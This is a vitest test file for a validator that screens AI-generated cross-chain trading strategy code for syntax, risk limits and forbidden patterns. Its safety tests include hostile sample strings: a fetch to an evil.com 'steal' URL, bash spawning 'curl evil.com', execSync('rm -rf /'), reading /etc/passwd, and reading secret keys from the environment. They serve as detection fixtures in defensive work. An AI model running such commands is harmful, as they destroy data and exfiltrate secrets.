// Tests for VariantValidator — validates AI-generated strategy code

import { describe, it, expect, beforeEach } from 'vitest';
import { Store } from '../../../core/store.js';
import { VariantValidator } from '../variant-validator.js';
import type { GeneratedVariant } from '../types.js';

function makeVariant(sourceCode: string): GeneratedVariant {
  return {
    id: 'test-variant-1',
    parentStrategy: 'base-strategy',
    sourceCode,
    mutationDescription: 'test mutation',
    generatedAt: Date.now(),
    status: 'generated',
  };
}

const VALID_STRATEGY_CODE = `
import type { StrategySignal, ExecutionPlan, StrategyContext } from '../core/types.js';
import { CrossChainStrategy } from './cross-chain-strategy.js';

export class TestVariant extends CrossChainStrategy {
  readonly name = 'test-variant';
  readonly timeframe = '5m';
  override readonly stoploss = -0.05;
  override readonly maxPositions = 3;
  override readonly minimalRoi = { 0: 0.03, 60: 0.01 };
  override readonly trailingStop = false;

  shouldExecute(context: StrategyContext): StrategySignal | null {
    return null;
  }

  buildExecution(signal: StrategySignal, context: StrategyContext): ExecutionPlan {
    return {
      id: 'plan-1',
      strategyName: this.name,
      actions: [],
      estimatedCostUsd: 0,
      estimatedDurationMs: 0,
      metadata: {},
    };
  }
}
`;

describe('VariantValidator', () => {
  let validator: VariantValidator;

  beforeEach(() => {
    Store.getInstance().reset();
    validator = new VariantValidator();
  });

  describe('validate (full pipeline)', () => {
    it('passes valid strategy code that extends CrossChainStrategy with safe risk params', async () => {
      const variant = makeVariant(VALID_STRATEGY_CODE);
      const result = await validator.validate(variant);

      expect(result.valid).toBe(true);
      expect(result.violations).toHaveLength(0);
      expect(result.syntaxValid).toBe(true);
      expect(result.extendsStrategy).toBe(true);
      expect(result.riskBoundsValid).toBe(true);
      expect(result.safetyCheckPassed).toBe(true);
    });

    it('fails on code that does not extend CrossChainStrategy', async () => {
      const code = `
export class TestVariant {
  readonly name = 'test-variant';
  someMethod() { return true; }
}
`;
      const variant = makeVariant(code);
      const result = await validator.validate(variant);

      expect(result.valid).toBe(false);
      expect(result.extendsStrategy).toBe(false);
      expect(result.violations).toContain('Class does not extend CrossChainStrategy');
    });

    it('fails on unsafe patterns', async () => {
      const code = `
export class TestVariant extends CrossChainStrategy {
  readonly name = 'test-variant';
  readonly timeframe = '5m';
  override readonly stoploss = -0.05;
  override readonly maxPositions = 3;
  override readonly minimalRoi = { 0: 0.03 };

  shouldExecute(context: StrategyContext): StrategySignal | null {
    eval("alert('hacked')");
    return null;
  }

  buildExecution(signal: StrategySignal, context: StrategyContext): ExecutionPlan {
    return { id: '1', strategyName: this.name, actions: [], estimatedCostUsd: 0, estimatedDurationMs: 0, metadata: {} };
  }
}
`;
      const variant = makeVariant(code);
      const result = await validator.validate(variant);

      expect(result.valid).toBe(false);
      expect(result.safetyCheckPassed).toBe(false);
    });
  });

  describe('checkSyntax', () => {
    it('returns true for valid class structure', () => {
      expect(validator.checkSyntax(VALID_STRATEGY_CODE)).toBe(true);
    });

    it('returns false when class keyword is missing', () => {
      const code = 'function foo() { return 1; }';
      expect(validator.checkSyntax(code)).toBe(false);
    });

    it('returns false on unbalanced braces', () => {
      const code = `
class Foo extends CrossChainStrategy {
  method() {
    if (true) {
  }
`;
      expect(validator.checkSyntax(code)).toBe(false);
    });

    it('returns false on unbalanced parentheses', () => {
      const code = `
class Foo extends CrossChainStrategy {
  method(a: string {
    return a;
  }
}
`;
      expect(validator.checkSyntax(code)).toBe(false);
    });
  });

  describe('checkExtendsStrategy', () => {
    it('returns true when class extends CrossChainStrategy', () => {
      expect(validator.checkExtendsStrategy('class MyStrat extends CrossChainStrategy {')).toBe(true);
    });

    it('returns false when class does not extend CrossChainStrategy', () => {
      expect(validator.checkExtendsStrategy('class MyStrat extends SomeOtherClass {')).toBe(false);
    });

    it('returns false when there is no class declaration', () => {
      expect(validator.checkExtendsStrategy('const x = 5;')).toBe(false);
    });
  });

  describe('checkRiskBounds', () => {
    it('passes valid risk parameters', () => {
      const code = `
class S extends CrossChainStrategy {
  override readonly stoploss = -0.05;
  override readonly maxPositions = 3;
  override readonly minimalRoi = { 0: 0.03, 60: 0.01 };
}`;
      const result = validator.checkRiskBounds(code);
      expect(result.valid).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('fails when stoploss absolute value is below 0.005', () => {
      const code = `
class S extends CrossChainStrategy {
  override readonly stoploss = -0.003;
  override readonly maxPositions = 3;
}`;
      const result = validator.checkRiskBounds(code);
      expect(result.valid).toBe(false);
      expect(result.violations.some((v) => v.includes('stoploss'))).toBe(true);
    });

    it('fails when maxPositions exceeds 10', () => {
      const code = `
class S extends CrossChainStrategy {
  override readonly stoploss = -0.05;
  override readonly maxPositions = 15;
}`;
      const result = validator.checkRiskBounds(code);
      expect(result.valid).toBe(false);
      expect(result.violations.some((v) => v.includes('maxPositions'))).toBe(true);
    });

    it('fails when minimalRoi has non-positive value', () => {
      const code = `
class S extends CrossChainStrategy {
  override readonly stoploss = -0.05;
  override readonly maxPositions = 3;
  override readonly minimalRoi = { 0: -0.01 };
}`;
      const result = validator.checkRiskBounds(code);
      expect(result.valid).toBe(false);
      expect(result.violations.some((v) => v.includes('minimalRoi'))).toBe(true);
    });
  });

  describe('checkSafety', () => {
    it('passes clean code without forbidden patterns', () => {
      const code = `
class S extends CrossChainStrategy {
  shouldExecute(ctx: StrategyContext): StrategySignal | null {
    const price = ctx.prices.get('1-0xtoken');
    return null;
  }
}`;
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(true);
      expect(result.violations).toHaveLength(0);
    });

    it('detects eval() usage', () => {
      const code = 'eval("malicious code")';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('eval'))).toBe(true);
    });

    it('detects walletClient access', () => {
      const code = 'const wallet = walletClient.getAddress();';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('walletClient'))).toBe(true);
    });

    it('detects privateKey access', () => {
      const code = 'const key = privateKey;';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('privateKey') || v.includes('Private key'))).toBe(true);
    });

    it('detects new Function() constructor', () => {
      const code = 'const fn = new Function("return 1")';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('Function'))).toBe(true);
    });

    it('detects fs module access', () => {
      const code = 'fs.readFileSync("/etc/passwd")';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('Filesystem') || v.includes('fs'))).toBe(true);
    });

    it('detects fetch() usage', () => {
      const code = 'fetch("https://evil.com/steal")';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('fetch'))).toBe(true);
    });

    it('detects require() usage', () => {
      const code = 'const os = require("os");';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('require'))).toBe(true);
    });

    it('detects dynamic import() usage', () => {
      const code = 'const mod = import("./evil-module");';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('import'))).toBe(true);
    });

    it('detects process.env access', () => {
      const code = 'const key = process.env.SECRET_KEY;';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('process.env') || v.includes('Environment'))).toBe(true);
    });

    it('detects hardcoded addresses longer than 10 hex chars', () => {
      const code = 'const addr = "0x1234567890abcdef";';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('address') || v.includes('Hardcoded'))).toBe(true);
    });

    it('detects child_process module access', () => {
      const code = 'import { exec } from "child_process";';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('child_process'))).toBe(true);
    });

    it('detects execSync usage', () => {
      const code = 'execSync("rm -rf /")';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('execSync'))).toBe(true);
    });

    it('detects spawn usage', () => {
      const code = 'spawn("bash", ["-c", "curl evil.com"])';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('spawn'))).toBe(true);
    });

    it('detects execFile usage', () => {
      const code = 'execFile("/usr/bin/python3", ["script.py"])';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('execFile'))).toBe(true);
    });

    it('detects __proto__ prototype pollution', () => {
      const code = 'obj.__proto__.polluted = true;';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('__proto__') || v.includes('Prototype'))).toBe(true);
    });

    it('detects constructor["prototype"] prototype pollution', () => {
      const code = 'obj.constructor["prototype"].polluted = true;';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('Prototype') || v.includes('prototype'))).toBe(true);
    });

    it('detects setTimeout usage', () => {
      const code = 'setTimeout(() => { stealFunds(); }, 1000);';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('setTimeout'))).toBe(true);
    });

    it('detects setInterval usage', () => {
      const code = 'setInterval(() => { exfiltrateData(); }, 5000);';
      const result = validator.checkSafety(code);
      expect(result.safe).toBe(false);
      expect(result.violations.some((v) => v.includes('setInterval'))).toBe(true);
    });
  });
});
